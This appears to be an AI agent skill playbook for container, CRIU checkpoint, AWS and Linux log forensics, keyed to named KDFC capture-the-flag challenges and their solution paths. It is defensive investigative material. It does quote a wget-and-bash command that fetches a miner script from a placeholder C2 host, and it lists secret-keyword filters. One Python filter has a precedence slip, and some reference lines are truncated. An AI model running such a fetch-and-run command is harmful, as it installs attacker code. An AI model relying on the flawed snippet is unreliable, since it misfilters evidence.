---
name: linux-container-cloud
description: |
  Container, Kubernetes/CRIU-checkpoint and cloud-log forensics on Linux. Handles Docker/OCI image tars
  (docker save vs docker export), K8s CRIU checkpoints (crit *.img, spec.dump, pages-*.img), AWS incident
  logs (CloudTrail/GuardDuty/Route53/S3 access/VPC Flow), Google Workspace exports, and generic Linux server
  logs. Enter when the artifact is a container/OCI tar, a checkpoint dir, a bundle of JSON/CSV cloud logs, or
  a Linux `/var/log` tree — to find a dropped payload, an IAM compromise chain, exfil volume, or persistence.
  Trigger keywords: docker, docker save, docker export, OCI, image config, manifest.json, index.json, whiteout,
  .wh., layer, rootfs, kubernetes, k8s, CRIU, crit, checkpoint, pages-*.img, spec.dump, pstree.img, cloudtrail,
  guardduty, route53, s3 access log, vpc flow, accessKeyId, roleSessionName, assumerole, userData, xmrig,
  google workspace, takeout, vault pst, auth.log, bash_history, wtmp, btmp, journald, cron, systemd, 컨테이너, 클라우드, 로그.
---

# Linux · Container · Cloud Forensics

## ACTION REQUIRED
1. `NOW` Confirm you arrived via `forensics-router` and `work/<case>/` exists with hashes verified and the answer
   **timezone** recorded in `scope.md`. If not → `case-ops` / run `scripts/case-init.sh`. Every timestamp below is
   emitted in UTC; convert to the challenge timezone before answering (AWS logs are UTC/`Z`; KDFC usually wants KST = UTC+9).
2. `NOW` Read `../../tool-index.md` and pick the available variant: `jq python3 docker 7z tar strings file xxd sqlite3`
   are ✅ here; `rg` is ❌ → use `grep -a`. `crit`/CRIU are Linux-only → run inside a Linux `docker` container.
3. `NEXT` Classify the artifact: OCI/Docker tar → §A; `checkpoint/`+`*.img`+`spec.dump` → §B; JSON/CSV cloud logs
   or a `/var/log` tree → §C.
4. `NEXT` Copy evidence read-only into `work/<case>/evidence/`; never `docker load`/`docker run` a hostile image on
   the host — extract with `tar`, and if you must execute, build the isolated no-network sandbox in §B.4.
5. `ACT` Run the phase workflow, keep every conclusion as `(claim → file + timestamp/line)`, log each step to `timeline.md`.

## When to use / hand off
| If the artifact is really… | Go to |
|----------------------------|-------|
| A memory dump / ELF core / `pages-*.img` with keys or injected code in RAM | `memory-forensics` |
| A raw disk / VMDK / ext4 image (not a container tar) | `disk-image` |
| pcap/VPC packet capture (not flow-log CSV) | `network-forensics` |
| EVTX / registry / Windows event logs | `windows-artifacts` |
| A wallet, mnemonic, tx hash, mining-pool payout to trace on-chain | `blockchain-forensics` |
| A dropped ELF payload that won't parse / is packed | `file-format-carving` |
| Timestomping / super-timeline across Linux logs | `anti-forensics-timeline` |

## Tools
- `jq` (✅) — the workhorse for every JSON log (CloudTrail, OCI `manifest.json`, `crit` output). 
- `python3` (✅) — `json`,`csv`,`shlex`,`base64`,`struct`,`collections` for shlex-safe S3 logs, byte reconciliation, PG-page carving.
- `docker` (✅) — build the isolated analysis sandbox; run `crit`/CRIU (Linux-only) in a container.
- `tar` / `7z` (✅) — list/extract OCI layers without loading the image (`tar -tvf`, `tar -xOf`).
- `strings`,`file`,`xxd` (✅) — triage extracted ELF payloads, confirm base64/text in `pages-*.img`.
- `sqlite3` (✅) — if a checkpoint/rootfs carries app DBs.
- `crit` (CRIU 3.17.x) — **not in tool-index (Linux-only)**; fallback: `docker run --rm -v "$PWD:/e" <criu-image> crit show /e/img`
  or `pip install crit` inside a Linux container. `crit show *.img` renders each CRIU image as JSON for `jq`.
- `aeskeyfind` — for keys in a raw memory blob; **missing on this host** → use in a Linux container or hand to `memory-forensics`.
- `rg` — ❌ here → substitute `grep -aob -F`.

---

## Workflow

## §A — Docker / OCI image forensics  (KDFC2026 #103 "What's in my container?")

The whole puzzle is usually **`docker save` (layered image) vs `docker export` (flat runtime snapshot)**: a dropped payload
exists only in the runtime snapshot, never in any image layer. Prove it with whiteout-aware reconstruction + a full diff.

### A.1 Identify which tar is which
```bash
IMG=webserver.tar          # docker save  → has index.json / manifest.json / blobs/ / <sha>.json config
SNAP=webserver_ts.tar      # docker export → a flat rootfs: bin/ etc/ usr/ tmp/ ... , NO manifest.json
tar -tf "$IMG"  | grep -E 'index.json|manifest.json|blobs/|\.json$' | head
tar -tf "$SNAP" | head                       # top-level filesystem dirs = export/runtime snapshot
```

### A.2 Build time: index.json → manifest.json → image config blob
Filename of the config blob = **sha256 of its content**; `.created` (not BuildKit provenance) is the graded build time.
```bash
mkdir imgx && tar -xf "$IMG" -C imgx && cd imgx
jq . index.json                              # → manifests[].digest = OCI image index blob
jq . manifest.json                           # → [0].Config = "<sha256>.json"  and [0].Layers[]
CONFIG=$(jq -r '.[0].Config' manifest.json)  # e.g. 3f22e85b...json  (blobs/sha256/<hash> in newer layouts)
jq -r '.created' "$CONFIG"                   # top-level build time (UTC) → convert to KST
jq -r '.history[] | "\(.created)  \(.created_by)"' "$CONFIG"   # per-layer build epochs + commands
# BuildKit provenance (attestation manifest → in-toto layer, .predicate.runDetails.metadata.startedOn/finishedOn)
# is CI wall-clock, NOT the config .created — do not confuse the two.
```

### A.3 ENV secrets baked into the image config (survive into process memory)
```bash
tar -xOf ../"$IMG" "$CONFIG" 2>/dev/null | jq -r '.config.Env[]  | select(test("SECRET|KEY|TOKEN|SUPABASE|PASS";"i"))'
tar -xOf ../"$IMG" "$CONFIG" 2>/dev/null | jq -r '.history[].created_by | select(test("SECRET|KEY|ENV ";"i"))'
# Cross-check the same string in any provided process memdump (the ENV block persists in the running process):
strings -a memdump.14836 | grep -F 'eyC73na0d0cm'      # double-proven: image metadata AND runtime env
```

### A.4 Find the runtime-only dropped payload
```bash
# 1) quick path grep in the runtime snapshot for writable-dir executables
tar -tvf "$SNAP" | grep -E ' (tmp/|var/tmp/|dev/shm/|root/|home/|opt/)' | grep -vE 'yarn-v1|/$'
# 2) PROVE it is absent from every image layer:
for L in $(jq -r '.[0].Layers[]' manifest.json); do echo "== $L"; tar -xOf ../"$IMG" "$L" | tar -tzf - 2>/dev/null; done \
  | grep -E 'tmp/.*\.(x86|elf|sh)' 
```

### A.5 Whiteout-aware rootfs reconstruction + diff  (the rigorous version of A.4)
```bash
# Apply layers in order; OCI whiteouts: ".wh.<name>" deletes <name>; ".wh..wh..opq" clears a dir.
mkdir root && for L in $(jq -r '.[0].Layers[]' manifest.json); do
  tar -xOf ../"$IMG" "$L" | tar -xz -C root 2>/dev/null
  # honor whiteouts:
  find root -name '.wh.*' | while read w; do d=$(dirname "$w"); n=$(basename "$w"); 
    [ "$n" = ".wh..wh..opq" ] && rm -rf "$d"/* || rm -rf "$d/${n#.wh.}"; rm -f "$w"; done
done
mkdir snap && tar -xf "$SNAP" -C snap 2>/dev/null
( cd root && find . -type f | sort ) > root.lst
( cd snap && find . -type f | sort ) > snap.lst
comm -13 root.lst snap.lst        # runtime-only files  → the dropped payload lives here (/tmp/<dropped-binary>)
comm -23 root.lst snap.lst        # image-only files (removed at runtime)
comm -12 root.lst snap.lst > common.lst   # then diff content of common files (etc/hostname, resolv.conf = Docker mounts)
```

### A.6 Extract + fingerprint the payload
```bash
tar -xOf "$SNAP" tmp/<dropped-binary> > <dropped-binary>
shasum -a256 <dropped-binary> ; file <dropped-binary>           # e.g. stripped, statically-linked x86 ELF, 0777
strings -a <dropped-binary> | grep -iE 'httpd|/proc/%d/cmdline|socket|stomp'   # Mirai-family markers
# hand a packed/obfuscated ELF to file-format-carving; hand VT/Hybrid-Analysis lookup to the report
```

---

## §B — Kubernetes / CRIU checkpoint forensics  (KDFC2026 #201 "Who stole my Honeypot?")

Analyze with **CRIT by chasing object references**, never by blind grepping. Zip usually holds
`dump/checkpoint/` (many `*.img`), `spec.dump`, `config.dump`, `rootfs-diff.tar`.

### B.1 Pod / container identity from CRI annotations
```bash
jq -r '.annotations | to_entries[] | select(.key|test("io.kubernetes.cri")) | "\(.key)=\(.value)"' spec.dump
#   io.kubernetes.cri.sandbox-name / .container-name / .container-type / .sandbox-namespace / .image-name
#   container-type=container = the real workload (not the pause sandbox)
jq -r '.process.args, .root.path' config.dump
crit show checkpoint/utsns-12.img     | jq -r '.entries[0].nodename'
crit show checkpoint/mountpoints-13.img | grep -aE 'postgresql|honeypot'
```

### B.2 Process path: pstree → core (comm) → mm (exe_file_id) → files (reg.name)
```bash
crit show checkpoint/pstree.img | jq -r '.entries[] | "\(.pid) ppid=\(.ppid)"'   # lineage; pick the DIRECT child, not a grandchild
PID=167702
crit show checkpoint/core-$PID.img | jq -r '.entries[0].tc.comm'                  # comm = cpu_hu
EFID=$(crit show checkpoint/mm-$PID.img | jq -r '.entries[0].exe_file_id')         # exe_file_id = 82
crit show checkpoint/files.img | jq -r ".entries[] | select(.id==$EFID) | .reg.name"   # /bitnami/postgresql/data/pg_wal/cpu_hu
CWD=$(crit show checkpoint/fs-$PID.img | jq -r '.entries[0].cwd_id')
crit show checkpoint/files.img | jq -r ".entries[] | select(.id==$CWD) | .reg.name"     # confirm cwd
```

### B.3 Attribute a `pages-N.img` to a process's shared memory, then search it
```bash
crit show checkpoint/memfd.img | jq -r '.entries[] | "\(.id) \(.inode_id) \(.name) \(.size)"'   # find largest /dev/zero shmid
# chain: memfd inode_id → pagemap-shmem-<shmid>.img .pages_id=N → files.img MEMFD id references that inode → PIDs MAP_SHARED it
crit show checkpoint/pagemap-shmem-13316.img | jq -r '.entries[] | .pages_id? // empty' | head
# only THEN scan pages-N.img (base64 C2/commands span 4 alignment shifts):
python3 - <<'PY'
import re,base64
d=open('checkpoint/pages-1.img','rb').read()
for m in re.finditer(rb'[A-Za-z0-9+/]{200,}={0,2}', d):
    for sh in range(4):
        b=m.group()[sh:]
        try: t=base64.b64decode(b+b'==',validate=False)
        except: continue
        if sum(32<=c<127 for c in t)/max(1,len(t))>0.9 and b'http' in t.lower() or b'curl' in t.lower():
            print(m.start(),sh,t[:200]); break
PY
# reverse-verify a candidate string is really present:
printf ' <attacker-ip>:<port>' | base64 | tr -d '=\n'   # → grep -aob -F that b64 in pages-1.img
# distinguish the DOWNLOAD C2 (curl/wget -O target) from the follow-on MINING pool socket (files.img INETSK / pages-1x.img c3pool markers)
```

### B.4 Carve PostgreSQL 8K pages from `pages-*.img` (recover rows / ransom note)
```bash
python3 - <<'PY'
import struct
d=open('checkpoint/pages-1.img','rb').read()
for off in range(0,len(d)-8192,8192):   # also try unaligned scan if pages spliced
    lsn,csum,flags,lower,upper,special,pver,prune=struct.unpack_from('<QHHHHHHI',d,off)
    if not (24<=lower<=upper<=special<=8192 and pver==0x2004): continue   # 0x2004 = 8192|v4
    n=(lower-24)//4
    for i in range(n):
        ip,=struct.unpack_from('<I',d,off+24+i*4)   # ItemIdData: off:15,flags:2,len:15
        toff=ip&0x7fff; tlen=(ip>>17)&0x7fff
        if not tlen: continue
        hoff=d[off+toff+22]                          # HeapTupleHeader t_hoff at +22
        raw=d[off+toff+hoff:off+toff+tlen]
        # first field varlena: length = (byte>>2)
        print(off, raw[:400])
PY
# verify raw→logical contiguity via pagemap-shmem present-range walk before trusting a carved offset.
```

### B.5 Isolated no-network sandbox for live malware / running CRIU
```bash
docker run --rm -it --network none --cap-drop=ALL --security-opt no-new-privileges \
  --read-only --tmpfs /tmp \
  -v "$PWD/dump:/case:ro" -v "$PWD/checkpoint:/evidence:ro" \
  <hardened-criu-image> /bin/sh      # crit/strings/jq inside; host stays clean, no egress
```

---

## §C — Cloud IR (AWS) + Google Workspace + Linux server logs  (KDFC2026 #153 "Operation Cloud Harvest")

Pure log correlation. Core skill = **separating GuardDuty true positives from noise by identifier linkage**, and
**integer-exact reconciliation**. Every conclusion = `(1) conclusion → (2) evidence: file + timestamp/log line`.

### C.1 Hash + normalize, then thread on `accessKeyId` + `roleSessionName`
```bash
for f in *.json *.csv *.log; do shasum -a256 "$f"; done      # confirm against provided MD5/SHA256
# CloudTrail is usually {"Records":[...]}; sort by time and pull the identity fields:
jq -r '.Records | sort_by(.eventTime)[] | [.eventTime,.eventName,.sourceIPAddress,
   .userIdentity.userName // .userIdentity.arn, .userIdentity.accessKeyId, (.errorCode//"OK")] | @tsv' cloudtrail.json > ct.tsv
# initial access = first successful GetCallerIdentity/Console login by the attacker key/IP
grep -P 'GetCallerIdentity' ct.tsv | head
```

### C.2 Privilege escalation via AssumeRole (correlate role ARN + session name + time)
```bash
jq -r '.Records[] | select(.eventName=="AssumeRole") |
  [.eventTime,(.errorCode//"OK"),.requestParameters.roleArn,.requestParameters.roleSessionName,
   .sourceIPAddress,.requestParameters.externalId] | @tsv' cloudtrail.json
# synthetic data does NOT keep temp-key strings consistent → correlate by roleSessionName + time order + S3 requester, not by key.
```

### C.3 Persistence — and confirm it actually succeeded
```bash
jq -r '.Records[] | select(.eventName|test("CreateUser|AttachUserPolicy|CreateAccessKey|CreateLoginProfile")) |
  [.eventTime,.eventName,(.errorCode//"OK"),(.responseElements|tostring)] | @tsv' cloudtrail.json
# CreateAccessKey with responseElements=null → new key ID absent → NOT confirmed. AccessDenied → excluded.
```

### C.4 Anti-logging: verify it did NOT succeed before claiming it
```bash
jq -r '.Records[] | select(.eventName|test("StopLogging|DeleteTrail|PutEventSelectors|PutBucketLogging|PutBucketLifecycle")) |
  [.eventTime,.eventName,.sourceIPAddress,(.errorCode//"SUCCESS")] | @tsv' cloudtrail.json
# if all four show AccessDenied → logging was NEVER disabled. Report that honestly.
```

### C.5 S3 exfil — shlex-parse the access log, integer-exact bytes
```bash
python3 - <<'PY'
import shlex,collections
tot=0; byb=collections.Counter()
for line in open('s3_access_logs.log'):
    p=shlex.split(line)                       # quoted URIs/UAs break naive split()
    op=p[7] if len(p)>7 else ''
    if 'REST.GET.OBJECT' in op:
        status=p[10]; bucket=p[1]; sent=p[12]; requester=p[4]
        if status=='200' and any(s in requester for s in ('prod-session-maint','deploy-temp')):
            b=int(sent) if sent.isdigit() else 0; tot+=b; byb[bucket]+=b
print('bytes',tot,'GiB',round(tot/1073741824,3)); print(byb)
PY
# cross-check: S3 bytes ↔ VPC Flow bytes to the receiving IPs ↔ Route53 resolutions → three-way agreement.
```

### C.6 Route53 + VPC Flow → pivot host, C2, mining pool
```bash
jq -r '.[] | select(.query_name|test("duckdns|supportxmr|xmr|pool"))
   | [.query_timestamp,.srcaddr,.srcids.instance,.query_name,.rcode] | @tsv' route53_resolver_logs.json
# VPC Flow (CSV): count flows per dst:port to separate scan / C2 :443 / mining :4444; ACCEPT vs REJECT
awk -F, 'NR>1{print $6":"$7,$14}' vpc_flow_logs.csv | sort | uniq -c | sort -rn | head
```

### C.7 GuardDuty triage — true positive only if it shares an attacker identifier
```bash
jq -r '.[] | [.type,.service.action.actionType,
   (.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4 // .resource.instanceDetails.instanceId // "-"),
   (.resource.accessKeyDetails.accessKeyId // "-")] | @tsv' guardduty_findings.json
# scary NAME ≠ in-scope. Benign: background port scans, SG-denied SSH brute force, compliance-scanner UA,
# Datadog health-check DNS, loadtest tags, EMR batch S3 discovery, corporate-VPN egress. Keep only findings that
# share the attacker key/session/IP/bucket/instance.
```

### C.8 base64 userData → mining scripts
```bash
jq -r '.Records[] | select(.eventName=="RunInstances") | .requestParameters.instancesSet.items[]?.userData // empty' \
  cloudtrail.json | while read u; do echo "$u" | base64 -d 2>/dev/null; echo; done
# → wget -q http://<C2>/xmrig.sh -O /tmp/xmrig.sh && bash /tmp/xmrig.sh
```

### C.9 Google Workspace  (KDFC2023 #303 "Audit My Corporation")
```bash
# three parallel sources: Takeout (per-user Gmail/Calendar/Chat/Drive), Vault (.pst), google_workspace_audit_report.json
jq -r '.items[]? | [.id.time,.actor.email,.events[].name,(.events[].parameters|tostring)] | @tsv' google_workspace_audit_report.json
readpst -o out vault_google_chat_0.pst          # read .pst on a UTC timeline; correlate with the audit JSON
# insiders launder provenance: trash → re-upload (new file id) → copy → rename → change sharing to people_with_link.
# a shared "document" that is really a PE decryptor → search chats/Meet-invite descriptions/email bodies for its CLI keys.
```

### C.10 Generic Linux server logs (persistence + timeline)
```bash
grep -aE 'Accepted|Failed|sudo|COMMAND=' /var/log/auth.log*     # logins, priv-esc; note UTC vs local
last  -f /var/log/wtmp ; lastb -f /var/log/btmp                 # good vs bad login sessions
cat /home/*/.bash_history /root/.bash_history 2>/dev/null       # no timestamps unless HISTTIMEFORMAT set
journalctl --no-pager -o short-iso -D /var/log/journal          # or: strings *.journal | grep -a MESSAGE=
ls -la /etc/cron* /var/spool/cron/*  ; systemctl list-unit-files --state=enabled
# persistence hotspots: /etc/cron.d, /etc/systemd/system/*.service (ExecStart), ~/.ssh/authorized_keys, /etc/ld.so.preload,
#   /etc/rc.local, malicious .service with WantedBy=multi-user.target. Convert every log line to the challenge TZ.
```

## Flag-hiding checklist
- **Container:** the payload is in the `docker export` snapshot only, in a writable dir (`/tmp`, `/var/tmp`, `/dev/shm`, `/root`); the "final build time" is image-config `.created`, not BuildKit `finishedOn`; secrets sit in `.config.Env` / `.history[].created_by` and re-appear in a process memdump's env block.
- **CRIU:** process paths hide behind `files.img` `reg.name` (chase `pstree→core→mm→files`); C2/commands live base64-encoded inside a `pages-*.img` that must first be tied to the process via `memfd/pagemap-shmem`; ransom notes are real PostgreSQL HeapTuples (page `version==0x2004`), not plain strings.
- **AWS:** the initial key is the first successful `GetCallerIdentity`; escalation is an `AssumeRole` with an `externalId`; the true C2/mining domain is often the only DNS-Firewall `BLOCK`; exfil volume is an integer byte sum that must match VPC Flow; userData base64 hides the miner installer.
- **Workspace/Linux:** answers hide in the audit JSON ↔ Vault `.pst` ↔ Takeout cross-reference; a shared "doc" with an `MZ`/PE header is a tool with keys split across Meet invite + email; Linux persistence in cron/systemd unit `ExecStart` and `authorized_keys`.

## Pitfalls
- Timezone: AWS/CloudTrail/S3/Route53 are UTC (`Z`); Google audit is UTC+0; Linux logs may be host-local. Always state the conversion to KST (or the required TZ) explicitly.
- Never `docker load`/`docker run` the evidence image on the host — `tar -xO` it, and execute only in the §B.5 no-network sandbox.
- Do not assume `pages-1.img` is the DB's memory — prove it via the `memfd → shmid → pages_id` chain first.
- Direct child vs grandchild: use `pstree.img` ppid, not exec timestamps.
- Over-claiming: a `CreateAccessKey` with `responseElements=null`, or any `AccessDenied` StopLogging/DeleteTrail, did **not** succeed — say "attempted, failed".
- GuardDuty finding name is marketing; require a shared identifier with the attacker chain before counting it a true positive.
- S3 access log fields break on naive space-split — use `shlex`. Count bytes as integers; never round mid-reconciliation.
- The re-uploaded copy in a Workspace leak is not the admin's original file (provenance confusion) — track file IDs.

## Worked precedents
- **KDFC2026 #103 "What's in my container?"** — `docker save` vs `docker export`; `index.json→manifest.json→config` `.created`; whiteout rootfs rebuild + `comm` diff finds `/tmp/<dropped-binary>` only in the runtime snapshot; ENV secret persists into the Node process memdump. See.
- **KDFC2026 #201 "Who stole my Honeypot?"** — CRIT reference-chasing on a K8s CRIU checkpoint; `memfd/pagemap-shmem` attributes `pages-1.img` to PostgreSQL; PG 8K page carve (`version==0x2004`) recovers the ransom note; hardened no-network Docker sandbox. See.
- **KDFC2026 #153 "Operation Cloud Harvest"** — full AWS IR: pivot on `accessKeyId`+`roleSessionName` across CloudTrail→S3→Route53→VPC Flow→GuardDuty; 7/11 findings are noise; anti-logging all AccessDenied; userData→xmrig. See.
- **KDFC2023 #303 "Audit My Corporation"** — Google Workspace via Takeout + Vault `.pst` + audit JSON on a UTC timeline; PE-in-`.pptx` decryptor with split keys. See.

## References
-. (#103, #153, #201),. (#303), `../../knowledge/web-dfir-sources.md`
- `../../references/magic-bytes.md` (ELF `7F 45 4C 46`, PE `4D 5A`, SQLite header, gzip layer members)
- OCI image-spec whiteouts: https://github.com/opencontainers/image-spec/blob/main/layer.md
- CRIU images / CRIT: https://criu.org/CRIT and https://criu.org/Images
- AWS CloudTrail record contents: https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-event-reference-record-contents.html
- S3 server access log format: https://docs.aws.amazon.com/AmazonS3/latest/userguide/LogFormat.html
- VPC Flow Logs fields: https://docs.aws.amazon.com/vpc/latest/userguide/flow-log-records.html
